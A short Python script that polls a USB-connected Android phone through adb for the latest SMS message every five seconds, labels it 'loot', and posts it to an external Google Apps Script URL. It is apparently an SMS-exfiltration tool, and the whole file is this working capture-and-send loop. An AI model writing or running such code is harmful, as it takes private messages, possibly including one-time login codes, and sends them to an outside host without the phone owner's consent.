import subprocess
import requests
import time


URL = "https://script.google.com/macros/s/AKfycbzEiiC-15BK5UswDnRS4KNTB7UG0AvRUqSE4cQxULD-jACv1yr4PsBOtNKKQ0sD7VpT/exec"

def get_sms():
    # This command grabs the last SMS received on the phone
    cmd = "adb shell content query --uri content://sms/inbox --projection body --limit 1"
    result = subprocess.check_output(cmd, shell=True).decode('utf-8')
    return result

while True:
    try:
        loot = get_sms()
        print(f"Loot found: {loot}")
        # Send it to the Navigator!
        requests.post(URL, json={"contents": loot})
    except Exception as e:
        print("No phone found. Check USB cable!")
    
    time.sleep(5) # Check every 5 seconds